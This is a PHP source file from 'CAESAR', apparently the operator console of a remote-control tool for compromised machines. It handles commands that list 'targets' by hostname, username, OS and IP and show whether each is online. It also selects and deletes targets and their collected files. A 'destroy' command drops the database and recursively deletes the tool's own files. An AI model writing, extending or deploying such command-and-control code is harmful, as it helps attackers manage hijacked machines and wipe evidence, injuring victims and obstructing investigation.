<?php

	/*
		CAESAR

		Author : Michele '0blio' Cisternino
		Email  : miki.cisternino@gmail.com
		Github : https://github.com/0blio

		This project is released under the GPL 3 license.
	*/

	$command = trim($_GET['command']);
	// Rimuovere anche gli spazi eccessivi in mezzo alla parole

	if ($command == 'exit') {
		session_destroy();
		$output = 'exit';

	} else if ($command == 'help') {
		$output = $db -> table ('help') -> eq('category', 'h') -> columns('command', 'description') -> asc('description') -> findAll();
		$output = to_html_table ($output);

	} else if ($command == 'ip') {
		$output = $_SERVER['REMOTE_ADDR'];
		// Add country

	} else if ($command === 'whoami') {
		$output = htmlspecialchars($_SESSION['username']);

	} else if ($command == 'date') {
		$output = date('Y-m-d H:i:s');

	} else if (startswith ($command, 'passwd')) {
		$arguments = get_arguments ('passwd', $command);

		if (count($arguments) == 2) {
			$new_password = $arguments[0];
			$confirm_new_password = $arguments[1];

			if ($new_password == $confirm_new_password) {
				$db -> table ('users') -> eq('username', $_SESSION['username']) -> update (['password' => password_hash($new_password, PASSWORD_BCRYPT)]);
				$output = system_message ('Password updated', 'notification');
			} else {
				$output = system_message ('Non matching passwords', 'error');
			}
		} else {
			$output = 'Usage: passwd NEW_PASSWORD CONFIRM_NEW_PASSWORD';
		}

	} else if ($command == 'targets') {
		$output = $db->table('targets')->columns('id', 'hostname', 'username', 'os', 'arch', 'ip', 'first_request', 'last_request', 'description')->findAll();

		// If there are some targets
		if (count($output) > 0) {

			$i = 0;
			foreach ($output as $row) {
				$target_online = "<center><span style=\"color:#e74c3c\">&#9679;</span></center>";

				// If the target requested or sended data to the server in the last 60 seconds is probably online
				if (strtotime(date('Y-m-d H:i:s')) - strtotime($row['last_request']) <= 30)
					$target_online = "<center><span style=\"color:#2ecc71\">&#9679;</span></center>";

				//array_push ($output[$i], $target_online);
				$output[$i]['online'] = $target_online;
				$i++;
			}

			$output = to_html_table ($output, ['ID', 'Hostname', 'Username', 'OS', 'Arch', 'IP address', 'First time seen', 'Last request', 'Description', 'Online']);
		} else {
			$output = system_message ('There are no targets', 'notification');
		}

	} else if (startswith ($command, 'select target')) {
		$arguments = get_arguments ('select target', $command);

		if (count($arguments) == 1) {
			$id = $arguments[0];

			if (only_digits($id)) {
				$valid_id = $db -> table ('targets') -> eq ('id', $id) -> exists();
				if ($valid_id)
					$output = 'selected';
				else
					$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');
			} else {
				$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');
			}
		} else {
			$output = 'Usage: select target ID';
		}

	} else if (startswith ($command, 'add description')) {
		$arguments = get_arguments ('add description', $command);

		if (count ($arguments) > 1) {
			$id = $arguments[0];

			// If the id is a valid number
			if (only_digits($id)) {

				// Removing id from arguments
				array_shift($arguments);

				// Merging the arguments in order to get description
				$description = implode (" ", $arguments);

				$valid_id = $db -> table ('targets') -> eq ('id', $id) -> exists();

				// For some reason update() don't return the number of affected rows
				if ($valid_id) {
					$db -> table ('targets') -> eq('id', $id) -> update (['description' => $description]);
					$output = system_message ('Target ' . $id . ' updated successfully', 'added');
				} else {
					$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');
				}
			} else {
				$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');
			}

		} else {
			$output = 'Usage: add description ID DESCRIPTION';
		}

	} else if (startswith ($command, 'delete target')) {

		$arguments = get_arguments ('delete target', $command);

		if (count($arguments) == 1) {
			$id = $arguments[0];

			if (only_digits($id)) {
				$target_unique_id = $db -> table ('targets') -> eq ('id', $id) -> columns ('unique_id') -> findAll();
				$removed = $db -> table ('targets') -> eq ('id', $id) -> remove();
				rrmdir ('files/' . $target_unique_id[0]['unique_id']);

				if ($removed)
					$output = system_message ('Target ' . htmlspecialchars($id) . ' removed successfully', 'removed');
				else
					$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');

			} else if ($id == '*') {
				$removed = $db -> table ('targets') -> remove();
				rrmdir ('files'); mkdir ('files', 0777);
				$output = system_message('All targets removed successfully', 'removed');

			} else {
				$output = system_message ('Invalid ID: ' . htmlspecialchars($id), 'error');
			}

		} else {
			$output = 'Usage: delete target ID';
		}

	} else if (startswith ($command, 'destroy')) {

		// Deleting database tables
		try {
			$db -> execute ("
				SET foreign_key_checks = 0;
				DROP TABLE IF EXISTS `help`, `targets`, `tasks`, `users`;
				SET foreign_key_checks = 1;
			");

			$output = system_message ('Tables deleted successfully', 'removed');
		} catch (Exception $e) {
			$output = system_message ('Error while deleting tables.', 'error');
		}

		$output .= '<br/>';

		// Trying to delete database (not always possible on free-hosting services)
		try {
			include ('database/config.php');
			$query = "DROP DATABASE $database";
			$db -> execute ($query);
			$output .= system_message ('Database deleted successfully', 'removed');
		} catch (Exception $e) {
			$output .= system_message ('Unable to delete the database.', 'error');
		}

		$output .= '<br/>';

		rrmdir (dirname(__DIR__));
		$output .= system_message ('Files removed successfully.', 'removed');

		//session_destroy();

	} else {
		$output = htmlentities($command) . ': Command not found';
	}
